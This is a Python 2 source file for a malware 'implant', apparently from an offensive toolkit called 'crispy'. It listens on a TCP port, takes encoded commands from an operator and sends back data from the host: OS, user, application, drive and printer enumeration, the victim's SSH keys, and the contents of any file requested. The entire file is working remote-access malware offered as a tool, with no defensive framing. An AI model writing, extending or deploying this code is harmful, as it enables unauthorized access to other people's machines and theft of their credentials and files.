import platform
import SocketServer
import sys

from crispy.os_types.macintosh import Mac
from crispy.encoders.mime import Mime

class ImplantHandler(SocketServer.BaseRequestHandler):
    
    def handle(self):
        if platform.system() == 'Darwin':
            victim = Mac()
        elif platform.system() == 'Windows':
            pass
        else:
            pass

        while True:
            try:
                cmd = cipher.decode(self.request.recv(1024)).strip()
                
                if cmd == "enum_os":
                    self.request.sendall(cipher.encode(victim.enum_os()))
                elif cmd == "enum_users":
                    self.request.sendall(cipher.encode(victim.enum_users()))
                elif cmd == "enum_applications":
                    self.request.sendall(cipher.encode(victim.enum_applications()))
                elif cmd == "enum_drives":
                    self.request.sendall(cipher.encode(victim.enum_drives()))
                elif cmd == "enum_printers":
                    self.request.sendall(cipher.encode(victim.enum_printers()))
                elif cmd == "get_ssh_keys":
                    self.request.sendall(cipher.encode(victim.get_ssh_keys()))
                elif cmd.startswith('upload') == True:
                    #files = command[7:].split(' ')
                    pass
                elif cmd.startswith('download') == True:
                    upFile = cmd[9:].split(' ')[0]
                    
                    f = open(upFile, 'rb')
                    while True:
                        data = f.read(1024)

                        if not data:
                            break
                        else:
                            self.request.sendall(data) 
                    f.close()
                    self.request.sendall("EOF!EOF!") 
                else:
                    self.request.sendall(cipher.encode("unknown command\n"))
            except:
                server.close_request(self.request)
                sys.exit(1)                            
        
if __name__ == "__main__":
    HOST, PORT = "localhost", 8080
    cipher = Mime()

    try:
        server = SocketServer.TCPServer((HOST, PORT), ImplantHandler)
        print "[+] Implant active...Terminate w/ Ctrl-C\n"
        server.serve_forever()
    except:
        print "[!] Couldn't start server"
